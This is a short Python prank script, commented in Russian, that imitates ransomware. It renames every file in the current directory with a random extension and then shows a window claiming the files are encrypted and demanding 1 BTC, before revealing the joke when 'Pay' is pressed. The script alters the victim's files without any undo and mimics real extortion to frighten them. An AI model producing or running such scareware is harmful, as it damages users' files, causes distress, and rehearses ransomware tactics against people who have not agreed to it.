import tkinter as tk
from tkinter import messagebox
import os
import random

def fake_ransomware():
    # Получаем список файлов в текущей директории
    files = os.listdir(".")

    #Переименовываем файлы (имитация шифрования)
    for filename in files:
        if filename != "fake_ransomware.py": #Исключаем сам скрипт
            try:
                new_extension = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=5))
                os.rename(filename, filename + "." + new_extension)
            except Exception as e:
                print(f"Ошибка при переименовании {filename}: {e}") #Сообщение об ошибке переименования

    #Создаем окно с требованием выкупа
    window = tk.Tk()
    window.title("Ваши файлы зашифрованы!")
    window.geometry("300x200")

    label = tk.Label(window, text="Все ваши файлы были зашифрованы.\nДля расшифровки переведите 1 BTC на указанный адрес.")
    label.pack(pady=10)

    #Обработчик нажатия кнопки "Оплатить"
    def pay_ransom():
        messagebox.showinfo("Оплата", "Поздравляем! Это был всего лишь розыгрыш. Ваши файлы в безопасности.")
        window.destroy()

    pay_button = tk.Button(window, text="Оплатить", command=pay_ransom)
    pay_button.pack(pady=10)

    window.mainloop()

if __name__ == "__main__":
    fake_ransomware()
